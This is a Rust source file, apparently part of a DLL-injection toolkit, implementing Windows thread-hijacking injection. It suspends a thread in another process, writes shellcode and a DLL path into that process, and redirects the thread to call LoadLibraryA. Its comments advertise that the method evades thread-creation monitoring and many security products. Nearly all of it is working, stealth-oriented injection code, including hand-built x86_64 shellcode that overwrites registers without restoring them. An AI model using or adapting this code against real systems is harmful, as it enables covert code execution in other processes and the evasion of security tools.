//! Thread hijacking injection.
//!
//! Suspends an existing thread in the target process, modifies its instruction
//! pointer to execute `LoadLibraryA`, then resumes it. No new threads are
//! created, making this significantly harder to detect.
//!
//! **Pros:** No thread creation — evades monitoring of `CreateRemoteThread` and
//! `NtCreateThreadEx`. Effective against many security products.
//! **Cons:** Riskier — if the hijacked thread is in a critical section, the
//! target may deadlock. Requires precise context manipulation.

use crate::config::InjectionConfig;
use crate::error::{DoctorError, Result};
use crate::method::InjectionMethod;
use crate::types::{Architecture, InjectionResult, Platform, ProcessInfo};

/// Thread context hijacking injection method.
pub struct ThreadHijackMethod;

impl InjectionMethod for ThreadHijackMethod {
    fn name(&self) -> &str {
        "thread_hijack"
    }

    fn description(&self) -> &str {
        "Thread context redirection — executes code via an existing thread to evade thread-creation monitoring"
    }

    fn supported_platforms(&self) -> &[Platform] {
        &[Platform::Windows]
    }

    fn supported_architectures(&self) -> &[Architecture] {
        // Thread hijacking requires architecture-specific shellcode.
        &[Architecture::X86_64]
    }

    fn is_stealth(&self) -> bool {
        true
    }

    fn reliability(&self) -> u8 {
        60
    }

    fn compatibility(&self) -> u8 {
        40
    }

    fn inject(&self, config: &InjectionConfig, target: &ProcessInfo) -> Result<InjectionResult> {
        use windows_sys::Win32::System::Threading::*;

        // Define the full context flag for AMD64 architectures.
        const CONTEXT_AMD64: u32 = 0x00100000;
        const CONTEXT_CONTROL_FLAG: u32 = CONTEXT_AMD64 | 0x01;
        const CONTEXT_INTEGER_FLAG: u32 = CONTEXT_AMD64 | 0x02;
        const CONTEXT_SEGMENTS_FLAG: u32 = CONTEXT_AMD64 | 0x04;
        const CONTEXT_FLOATING_POINT_FLAG: u32 = CONTEXT_AMD64 | 0x08;
        const CONTEXT_FULL_VALUE: u32 = CONTEXT_CONTROL_FLAG
            | CONTEXT_INTEGER_FLAG
            | CONTEXT_SEGMENTS_FLAG
            | CONTEXT_FLOATING_POINT_FLAG;

        let dll_path_string = config
            .dll_path
            .to_str()
            .ok_or_else(|| DoctorError::InvalidPath("The provided DLL path contains non-UTF-8 characters".into()))?;

        let mut dll_path_bytes = dll_path_string.as_bytes().to_vec();
        dll_path_bytes.push(0);

        log::info!(
            "[thread_hijack] Initiating context redirection of '{}' into {} (Process ID: {})",
            dll_path_string,
            target.name,
            target.pid
        );

        let target_process = super::super::open_process_for_injection(target.pid)?;
        let load_library_procedure = super::super::resolve_load_library_a()?;

        unsafe {
            // Allocate memory and write the DLL path into the target process space.
            let remote_path_address = super::super::remote_alloc_and_write(target_process.raw(), &dll_path_bytes)?;

            // Identify a suitable thread within the target process for redirection.
            let target_thread_id = locate_suitable_thread(target.pid)?;

            let thread_access_rights = THREAD_SUSPEND_RESUME
                | THREAD_GET_CONTEXT
                | THREAD_SET_CONTEXT
                | THREAD_QUERY_INFORMATION;

            let thread_handle_raw = OpenThread(thread_access_rights, 0, target_thread_id);
            let target_thread_handle = super::super::SafeHandle::new(thread_handle_raw).ok_or_else(|| {
                DoctorError::injection_failed(format!("Unable to open target thread {}", target_thread_id))
            })?;

            // Suspend the target thread to perform context manipulation.
            if SuspendThread(target_thread_handle.raw()) == u32::MAX {
                super::super::remote_free(target_process.raw(), remote_path_address);
                return Err(super::super::last_os_error());
            }

            // Retrieve the current register state (context) of the target thread.
            let mut thread_context: windows_sys::Win32::System::Diagnostics::Debug::CONTEXT =
                std::mem::zeroed();
            thread_context.ContextFlags = CONTEXT_FULL_VALUE;

            if windows_sys::Win32::System::Diagnostics::Debug::GetThreadContext(
                target_thread_handle.raw(),
                &mut thread_context,
            ) == 0
            {
                ResumeThread(target_thread_handle.raw());
                super::super::remote_free(target_process.raw(), remote_path_address);
                return Err(super::super::last_os_error());
            }

            let original_instruction_pointer = thread_context.Rip;

            // Assemble x86_64 shellcode to invoke LoadLibraryA and return to the original execution flow.
            let redirection_shellcode = build_redirection_shellcode_x64(
                remote_path_address as u64,
                load_library_procedure as u64,
                original_instruction_pointer,
            );

            // Write the redirection shellcode into the target process.
            let shellcode_allocation_address = super::super::remote_alloc_and_write(target_process.raw(), &redirection_shellcode)?;

            // Update memory protections to allow execution of the redirection shellcode.
            let mut previous_protection_flags = 0u32;
            windows_sys::Win32::System::Memory::VirtualProtectEx(
                target_process.raw(),
                shellcode_allocation_address,
                redirection_shellcode.len(),
                windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ,
                &mut previous_protection_flags,
            );

            // Modify the thread's instruction pointer to point to the redirection shellcode.
            thread_context.Rip = shellcode_allocation_address as u64;

            if windows_sys::Win32::System::Diagnostics::Debug::SetThreadContext(
                target_thread_handle.raw(),
                &thread_context,
            ) == 0
            {
                ResumeThread(target_thread_handle.raw());
                super::super::remote_free(target_process.raw(), remote_path_address);
                super::super::remote_free(target_process.raw(), shellcode_allocation_address);
                return Err(super::super::last_os_error());
            }

            // Resume the thread to execute the injected payload redirection.
            ResumeThread(target_thread_handle.raw());

            // Allow a brief period for the redirection shellcode to finalize execution.
            std::thread::sleep(std::time::Duration::from_millis(500));

            // Release the memory allocated for the redirection shellcode.
            super::super::remote_free(target_process.raw(), shellcode_allocation_address);

            log::info!(
                "[thread_hijack] Context redirection procedure completed via thread {}",
                target_thread_id
            );

            Ok(InjectionResult {
                method_name: self.name().to_string(),
                target: target.clone(),
                dll_path: config.dll_path.clone(),
                base_address: None,
                details: format!("Thread context redirection successful (Thread ID: {})", target_thread_id),
            })
        }
    }
}

/// Identifies the first available thread belonging to the specified process.
fn locate_suitable_thread(process_id: u32) -> Result<u32> {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::*;

    unsafe {
        let snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        let snapshot =
            super::super::SafeHandle::new(snapshot_handle).ok_or_else(super::super::last_os_error)?;

        let mut thread_entry: THREADENTRY32 = std::mem::zeroed();
        thread_entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(snapshot.raw(), &mut thread_entry) != 0 {
            loop {
                if thread_entry.th32OwnerProcessID == process_id {
                    return Ok(thread_entry.th32ThreadID);
                }
                if Thread32Next(snapshot.raw(), &mut thread_entry) == 0 {
                    break;
                }
            }
        }
    }

    Err(DoctorError::injection_failed(format!(
        "No active threads were discovered for Process ID {}",
        process_id
    )))
}

/// Constructs x86_64 shellcode that invokes `LoadLibraryA` and returns to the `original_instruction_pointer`.
fn build_redirection_shellcode_x64(
    dll_path_address: u64,
    load_library_address: u64,
    original_instruction_pointer: u64,
) -> Vec<u8> {
    let mut shellcode_buffer = Vec::with_capacity(64);

    // Reserve shadow space on the stack (0x28 bytes for alignment).
    shellcode_buffer.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

    // Move the DLL path address into the RCX register (first argument).
    shellcode_buffer.push(0x48);
    shellcode_buffer.push(0xB9);
    shellcode_buffer.extend_from_slice(&dll_path_address.to_le_bytes());

    // Move the LoadLibraryA address into the RAX register.
    shellcode_buffer.push(0x48);
    shellcode_buffer.push(0xB8);
    shellcode_buffer.extend_from_slice(&load_library_address.to_le_bytes());

    // Execute the call to LoadLibraryA.
    shellcode_buffer.extend_from_slice(&[0xFF, 0xD0]);

    // Restore the stack pointer.
    shellcode_buffer.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);

    // Move the original instruction pointer into the RAX register.
    shellcode_buffer.push(0x48);
    shellcode_buffer.push(0xB8);
    shellcode_buffer.extend_from_slice(&original_instruction_pointer.to_le_bytes());

    // Jump to the original execution point.
    shellcode_buffer.extend_from_slice(&[0xFF, 0xE0]);

    shellcode_buffer
}
